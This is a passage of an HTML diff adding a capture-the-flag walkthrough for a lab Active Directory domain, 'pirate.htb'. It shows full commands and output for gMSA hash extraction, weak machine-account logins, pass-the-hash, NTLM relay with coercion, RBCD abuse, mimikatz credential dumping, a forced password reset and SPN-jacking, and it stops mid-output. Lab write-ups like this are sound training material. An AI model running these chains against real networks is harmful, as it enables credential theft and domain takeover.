+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Total records returned: 6 <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DC01$ <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WEB01$ <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MS01$ <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; EXCH01$ <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gMSA_ADCS_prod$ <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gMSA_ADFS_prod$ <br>
+
+         </div>
+
+         <p>
+            I immediately notice the presence of the <span class="highlight">gMSA_ADCS_prod</span> and <span class="highlight">gMSA_ADFS_prod</span> accounts. 
+            GMSAs are dedicated accounts for service protection and credential management. <span class="highlight">nxc</span> provides a module for enumerating 
+            this type of account:
+         </p>
+         
+         <div class="code">
+            k0d14k@kpb:~/Documenti/pirate/enum$ nxc ldap 10.129.35.174 -u pentest -p 'p3nt3st2025!&' --gmsa <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never)  <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [+] pirate.htb\pentest:p3nt3st2025!&  <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Getting GMSA Passwords <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Account: gMSA_ADCS_prod$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NTLM: <no read permissions>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PrincipalsAllowedToReadPassword: Domain Secure Servers <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.129.35.174&nbsp;&nbsp; 389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Account: gMSA_ADFS_prod$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NTLM: <no read permissions>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PrincipalsAllowedToReadPassword: Domain Secure Servers <br>
+         </div>
+
+         <p>Unfortunately we don't have read permissions.</p>
+
+         <p>We are looking for initial access, which means our target is a low-privilege user.</p>
+
+         <p>
+            Among the listed users I would exclude <span class="highlight">pentest</span>, which is already ours, and <span class="highlight">a.white_adm</span>, 
+            which is clearly the administrative version of <span class="highlight">a.white</span>. The remaining candidates are therefore <span class="highlight">a.white</span> 
+            and <span class="highlight">j.sparrow</span>. Additionally, it's worth remembering that every computer has a Computer account that behaves like a regular 
+            user, so I would add <span class="highlight">MS01</span>, <span class="highlight">WEB01</span> and <span class="highlight">EXCH01</span> to the list:
+         </p>
+
+         <ul>
+            <li>a.white</li>
+            <li>j.sparrow</li>
+            <li>MS01</li>
+            <li>WEB01</li>
+            <li>EXCH01</li>
+         </ul>
+
+         <p>
+            I notice that all the mentioned computers are part of the <span class="highlight">PRE-WINDOWS 2000 COMPATIBLE ACCESS</span> group. 
+            This particular group adds access compatibility with legacy systems such as <span class="highlight">Windows NT 4.0</span>. 
+            A notable characteristic of this group is that, if not properly configured, accounts tend to have weak passwords (often the computer name itself).
+         </p>
+
+         <p>
+            Using the <a target="_blank" href="https://github.com/garrettfoster13/pre2k">pre3k</a> tool it is possible to enumerate these accounts and obtain valid Kerberos credentials:
+         </p>
+
+         <div class="code">
+            k0d14k@kpb:~/Documenti/pirate/enum$ pre2k auth -u pentest -p 'p3nt3st2025!&' -d pirate.htb -dc-ip 10.129.35.174 <br>
+ <br>
+[...] <br>
+ <br>
+[21:42:05] INFO&nbsp;&nbsp;&nbsp;&nbsp; Retrieved 6 results total. <br>
+[21:42:05] INFO&nbsp;&nbsp;&nbsp;&nbsp; Testing started at 2026-04-10 21:42:05&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+[21:42:05] INFO&nbsp;&nbsp;&nbsp;&nbsp; Using 10 threads <br>
+[21:42:05] INFO&nbsp;&nbsp;&nbsp;&nbsp; VALID CREDENTIALS: pirate.htb\EXCH01$:exch01 <br>
+[21:42:05] INFO&nbsp;&nbsp;&nbsp;&nbsp; VALID CREDENTIALS: pirate.htb\MS01$:ms01
+         </div>
+
+         <p>I repeat the previous enumeration with the new accounts, obtaining access to the NTLM hashes of the GMSA accounts via the MS01 account:</p>
+         
+         <div class="code">
+            k0d14k@kpb:~/Documenti/pirate$ nxc ldap pirate.htb -u MS01$ -p ms01 --gmsa -k <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pirate.htb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never)  <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pirate.htb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [+] pirate.htb\MS01$:ms01  <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pirate.htb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Getting GMSA Passwords <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pirate.htb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Account: gMSA_ADCS_prod$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NTLM: 89fb53c2bc3eadb4142b4158cfdb2997&nbsp;&nbsp;&nbsp;&nbsp; PrincipalsAllowedToReadPassword: Domain Secure Servers <br>
+LDAP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pirate.htb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;389&nbsp;&nbsp;&nbsp;&nbsp;DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Account: gMSA_ADFS_prod$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NTLM: accd0fdfe82ff8c84cd710244c7302e8&nbsp;&nbsp;&nbsp;&nbsp; PrincipalsAllowedToReadPassword: Domain Secure Servers <br>
+
+         </div>
+      </section>
+
+      <section id="foothold">
+         <h2>cat foothold</h2>
+
+         <p>
+            Once the NTLM hashes are obtained, I can use the <span class="highlight">winrm</span> module of <span class="highlight">nxc</span> to establish a 
+            reverse shell on the domain controller <span class="highlight">DC01.pirate.htb</span>.
+         </p>
+         
+         <div class="code">
+            k0d14k@kpb:~/Documenti/pirate$ nxc winrm pirate.htb -u gMSA_ADFS_prod$ -H accd0fdfe82ff8c84cd710244c7302e8 <br>
+WINRM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.35.174&nbsp;&nbsp; 5985&nbsp;&nbsp; DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb)&nbsp;&nbsp;<br>
+WINRM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10.129.35.174&nbsp;&nbsp; 5985&nbsp;&nbsp; DC01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [+] pirate.htb\gMSA_ADFS_prod$:accd0fdfe82ff8c84cd710244c7302e8 (Pwn3d!)
+         </div>
+      </section>
+
+      <section id="user-flag">
+         <h2>cat user-flag</h2>
+
+         <p>Once the shell is obtained, I begin enumerating my surroundings. I notice that the machine has a second network interface on a different subnet:</p>
+
+         <div class="code">
+            C:\Users\gMSA_ADFS_prod$\Desktop>ipconfig                                 <br>
+            ipconfig <br>
+            <br>
+            Windows IP Configuration <br>
+            <br>
+            <br>
+            Ethernet adapter vEthernet (Switch01): <br>
+            <br>
+            Connection-specific DNS Suffix  . :  <br>
+            Link-local IPv6 Address . . . . . : fe80::d976:c606:587e:f1e1%8 <br>
+            IPv4 Address. . . . . . . . . . . : 192.168.100.1 <br>
+            Subnet Mask . . . . . . . . . . . : 255.255.255.0 <br>
+            Default Gateway . . . . . . . . . :  <br>
+            <br>
+            Ethernet adapter Ethernet0 2: <br>
+            <br>
+            Connection-specific DNS Suffix  . : .htb <br>
+            IPv4 Address. . . . . . . . . . . : 10.129.35.174 <br>
+            Subnet Mask . . . . . . . . . . . : 255.255.0.0 <br>
+            Default Gateway . . . . . . . . . : 10.129.0.1
+         </div>
+
+         <p>
+            I upload the <span class="highlight">ligolo</span> agent to the Desktop of the victim machine and pivot into the subnet. Once the pivot is set up, 
+            I use a self-made one-liner to identify which machines respond within the network, discovering that the only two are:
+         </p>
+
+         <ul>
+            <li>192.168.100.1 (DC01.pirate.htb)</li>
+            <li>192.168.100.2 (WEB01.pirate.htb)</li>
+         </ul>
+
+         <p>I then verify that the credentials I have also work on this machine and that this target also allows <span class="highlight">winrm</span> execution:</p>
+
+         <div class="code">
+            k0d14k@kpb:~/Documenti/pirate/foothold$ nxc winrm 192.168.100.2 -u gMSA_ADFS_prod$ -H accd0fdfe82ff8c84cd710244c7302e8 <br>
+WINRM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 192.168.100.2&nbsp;&nbsp; 5985&nbsp;&nbsp; WEB01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[*] Windows 10 / Server 2019 Build 17763 (name:WEB01) (domain:pirate.htb)&nbsp;&nbsp;<br>
+WINRM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 192.168.100.2&nbsp;&nbsp; 5985&nbsp;&nbsp; WEB01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[+] pirate.htb\gMSA_ADFS_prod$:accd0fdfe82ff8c84cd710244c7302e8 (Pwn3d!)
+         </div>
+
+         <p>And I open a reverse shell on <span class="highlight">WEB01</span>:</p>
+
+         <div class="code">
+            PS C:\Users> hostname <br>
+            WEB01 <br>
+            PS C:\Users> <br> 
+         </div>
+
+         <p>
+            The <span class="highlight">dir</span> command on the <span class="highlight">C:\Users</span> folder shows the presence of an <span class="highlight">a.white</span> 
+            folder. On Windows, home directories are created on the user's first login. If a user has never logged into a given machine there will be no home directory, 
+            but by the same logic we can infer that <span class="highlight">a.white</span> does log into <span class="highlight">WEB01</span>:
+         </p>
+         
+         <div class="code">
+            PS C:\Users> dir <br>
+&nbsp;&nbsp; Directory: C:\Users <br>
+Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LastWriteTime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Length Name <br>
+d-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1/15/2026&nbsp;&nbsp; 7:37 PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a.white <br>
+d-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 6/9/2025&nbsp;&nbsp;10:11 AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Administrator <br>
+d-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 6/9/2025&nbsp;&nbsp; 6:55 AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Administrator.PIRATE <br>
+d-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 6/9/2025&nbsp;&nbsp; 7:31 AM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gMSA_ADFS_prod$ <br>
+d-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1/15/2026&nbsp;&nbsp; 6:40 PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gMSA_ADFS_prod$.PIRATE <br>
+d-r---&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 6/8/2025&nbsp;&nbsp; 1:29 PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Public
+         </div>
+
+         <p>
+            The next step is to obtain credentials for <span class="highlight">a.white</span>. I'm learning a technique that, given certain prerequisites, allows 
+            extracting credentials from the <span class="highlight">lsass</span> process. The technique in question is RBCD (Resource Based Constrained Delegation). 
+            Here is how it works in practice:
+         </p>
+
+         <ol>
+            <li>A machine account must be created inside the compromised machine.</li>
+            <li>
+               This machine account is inserted into the <span class="highlight">msDS-AllowedToActOnBehalfOfOtherIdentity</span> attribute 
+               (the attribute used to determine whether a requestor can perform an operation on behalf of another - delegation).
+            </li>
+            <li>The delegation is used to request a Kerberos TGT ticket for authentication.</li>
+         </ol>
+         
+         <p>
+            The first step is to obtain the LDAP shell. To do so, we use a relay attack on the domain controller combined with a coercion on the target WEB01 
+            to force an authentication request.
+         </p>
+
+         <p>This is possible because SMB signing is not required towards this target:</p>
+         
+         <div class="code">
+            k0d14k@kpb:~/Documenti/pirate/foothold/realy-dump$ nxc smb WEB01.pirate.htb -u 'gMSA_ADFS_prod$' -H accd0fdfe82ff8c84cd710244c7302e8 <br>
+SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 192.168.100.2&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;WEB01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:None) <br>
+SMB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 192.168.100.2&nbsp;&nbsp; 445&nbsp;&nbsp;&nbsp;&nbsp;WEB01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[+] pirate.htb\gMSA_ADFS_prod$:accd0fdfe82ff8c84cd710244c7302e8 
+         </div>
+
+         <p>
+            I set <span class="highlight">ntlmrelayx</span> to listen and perform the coercion using the <span class="highlight">coerce_plus</span> 
+            module of <span class="highlight">nxc</span>.
+         </p>
+
+         <div class="code">
+            sudo $(which ntlmrelayx.py) -t ldaps://pirate.htb -i -smb2support --remove-mic --delegate-access
+         </div>
+         
+         <div class="code">
+            nxc smb WEB01.pirate.htb -u 'gMSA_ADFS_prod$' -H accd0fdfe82ff8c84cd710244c7302e8 -M coerce_plus -o L=10.10.15.169
+         </div>
+
+         <p>
+            Once the attack is launched, the <span class="highlight">ntlmrelayx</span> output will show a line indicating the localhost 
+            address and a port to connect to the LDAP shell.
+         </p>
+
+         <img src="images/Pasted image 20260415234603.png" width="1000rem">
+         
+         <p>We can now carry out the actual attack that will make us local admin on WEB01:</p>
+
+         <p>From the victim machine</p>
+         <div class="code">
+            add_computer k0d14k$ Password123! <br>
+            set_rbcd WEB01$ k0d14k$
+         </div>
+
+         <p>From the attacker machine</p>
+         <div class="code">
+            getST.py -spn cifs/WEB01.pirate.htb -impersonate Administrator -dc-ip pirate.htb 'pirate.htb/k0d14k$:Password123!'
+         </div>
+
+         <img src="images/Pasted image 20260415235706.png" width="1000rem">
+
+         <p>At this point we can open a shell as local <span class="highlight">Administrator</span> on <span class="highlight">WEB01</span>.</p>
+
+         <div class="code">
+            k0d14k@kpb:~/Documenti/pirate/foothold$ export KRB5CCNAME=k0d14k-admin.ccache <br> 
+            k0d14k@kpb:~/Documenti/pirate/foothold$ psexec.py -k -no-pass WEB01.pirate.htb <br> 
+            Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies  <br> 
+            <br> 
+            [*] Requesting shares on WEB01.pirate.htb..... <br> 
+            [*] Found writable share ADMIN$ <br> 
+            [*] Uploading file omdABkkx.exe <br> 
+            [*] Opening SVCManager on WEB01.pirate.htb..... <br> 
+            [*] Creating service kBYd on WEB01.pirate.htb..... <br> 
+            [*] Starting service kBYd..... <br> 
+            [!] Press help for extra shell commands <br> 
+            Microsoft Windows [Version 10.0.17763.8385] <br> 
+            (c) 2018 Microsoft Corporation. All rights reserved. <br> 
+            <br> 
+            whoami <br> 
+            nt authority\system
+         </div>
+
+         <p>
+            After gaining access as Admin we would already be able to read the user flag, but we need to obtain access as 
+            <span class="highlight">a.white_adm</span> first. This user has certain privileges that will be useful for achieving domain Admin.
+         </p>
+
+         <p>
+            We can run <span class="highlight">mimikatz</span> to dump the <span class="highlight">lsass</span> process and obtain the credentials 
+            stored in memory:
+         </p>
+         
+         <div class="code">
+            C:\Windows\Temp> .\mimikatz.exe <br> 
+            [...] <br> 
+            Authentication Id : 0 ; 124079 (00000000:0001e4af) <br> 
+            Session&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  : Interactive from 1 <br> 
+            User Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: a.white <br> 
+            Domain&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: PIRATE <br> 
+            Logon Server&nbsp;&nbsp;&nbsp;&nbsp;: DC01 <br> 
+            Logon Time&nbsp;&nbsp;&nbsp;&nbsp;  : 4/15/2026 8:21:37 AM <br> 
+            SID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: S-1-5-21-4107424128-4158083573-1300325248-3101 <br> 
+            msv :	 <br> 
+            &nbsp;&nbsp;[00000003] Primary <br> 
+            &nbsp;&nbsp;* Username : a.white <br> 
+            &nbsp;&nbsp;* Domain&nbsp;&nbsp;: PIRATE <br> 
+            &nbsp;&nbsp;* NTLM&nbsp;&nbsp;  : d2593a013aaf8e077ab0e69f9471b4c1 <br> 
+            &nbsp;&nbsp;* SHA1&nbsp;&nbsp;  : 755912e894d8347ea6db2b8da1633be4de224549 <br> 
+            &nbsp;&nbsp;* DPAPI&nbsp;&nbsp; : ff83a73735dcaf07aaab8c174e9d1284 <br> 
+            tspkg :	 <br> 
+            wdigest :	 <br> 
+            &nbsp;&nbsp;* Username : a.white <br> 
+            &nbsp;&nbsp;* Domain&nbsp;&nbsp;: PIRATE <br> 
+            &nbsp;&nbsp;* Password : (null) <br> 
+            kerberos :	 <br> 
+            &nbsp;&nbsp;* Username : a.white <br> 
+            &nbsp;&nbsp;* Domain&nbsp;&nbsp;: PIRATE.HTB <br> 
+            &nbsp;&nbsp;* Password : (null) <br> 
+            ssp :	 <br> 
+            credman :	 <br> 
+            [...]
+         </div>
+
+         <p>
+            Once the NTLM hash of <span class="highlight">a.white</span> is obtained, we can escalate to <span class="highlight">a.white_adm</span> 
+            by abusing the <span class="highlight">ForceChangePassword</span> privilege identified by Bloodhound.
+         </p>
+         
+         <div class="code">
+            k0d14k@kpb:~/Documenti/pirate/foothold$ changepasswd.py 'pirate.htb/a.white_adm@pirate.htb' -hashes :d2593a013aaf8e077ab0e69f9471b4c1 -altuser a.white -althash d2593a013aaf8e077ab0e69f9471b4c1 -newpass 'Password123!' -reset <br>
+            Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies  <br>
+            <br>
+            [*] Setting the password of pirate.htb\a.white_adm as pirate.htb\a.white <br>
+            [*] Connecting to DCE/RPC as pirate.htb\a.white <br>
+            [*] Password was changed successfully. <br>
+            [!] User no longer has valid AES keys for Kerberos, until they change their password again.
+         </div>
+      </section>
+
+      <section id="privilege-escalation">
+         <h2>cat privilege-escalation</h2>
+         <p>Once the password is changed, I notice that I have delegation rights for some SPNs on WEB01:</p>
+
+         <div class="code">
+            k0d14k@kpb:~/Documenti/pirate/foothold/ligolo$ findDelegation.py -user 'a.white_adm' 'pirate.htb/a.white_adm:Password123!' <br>
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies&nbsp;&nbsp;<br>
+ <br>
+AccountName&nbsp;&nbsp;AccountType&nbsp;&nbsp;DelegationType&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DelegationRightsTo&nbsp;&nbsp;&nbsp;&nbsp; SPN Exists&nbsp;&nbsp;<br>
+-----------&nbsp;&nbsp;-----------&nbsp;&nbsp;----------------------------------&nbsp;&nbsp;---------------------&nbsp;&nbsp;---------- <br>
+a.white_adm&nbsp;&nbsp;Person&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Constrained w/ Protocol Transition&nbsp;&nbsp;http/WEB01.pirate.htb&nbsp;&nbsp;Yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
+a.white_adm&nbsp;&nbsp;Person&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Constrained w/ Protocol Transition&nbsp;&nbsp;HTTP/WEB01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Yes 
+         </div>
+
+         <p>
+            Since Bloodhound shows that this user has <span class="highlight">WriteSPN</span> privileges over <span class="highlight">DC01.pirate.htb</span>, 
+            we can use a technique called <span class="highlight">SPN-Jacking</span> to add an SPN to the DC and obtain a ticket as Administrator:
+         </p>
+
+         <img src="images/Pasted image 20260417190116.png" width="1000rem">
+
+         <p>The first step is to clear the existing SPNs, as they must be unique within Active Directory:</p>
+
+         <div class="code">
+            (venv) k0d14k@kpb:~/Documenti/pirate/root/krbrelayx$ python3 addspn.py --clear -t 'WEB01$' -u "pirate.htb\a.white_adm" -p "Password123!" 'DC01.pirate.htb' <br>
+            [-] Connecting to host... <br>
+            [-] Binding to host <br>
+            [+] Bind OK <br>
+            [+] Found modification target <br>
+            [+] Printing object before clearing <br>
+            DN: CN=WEB01,CN=Computers,DC=pirate,DC=htb - STATUS: Read - READ TIME: 2026-04-17T19:04:04.551231 <br>
+            &nbsp;&nbsp; dNSHostName: WEB01.pirate.htb <br>
+            &nbsp;&nbsp; sAMAccountName: WEB01$ <br>
+            &nbsp;&nbsp; servicePrincipalName: tapinego/WEB01 <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tapinego/WEB01.pirate.htb <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WSMAN/WEB01 <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WSMAN/WEB01.pirate.htb <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HOST/WEB01.pirate.htb <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RestrictedKrbHost/WEB01.pirate.htb <br>
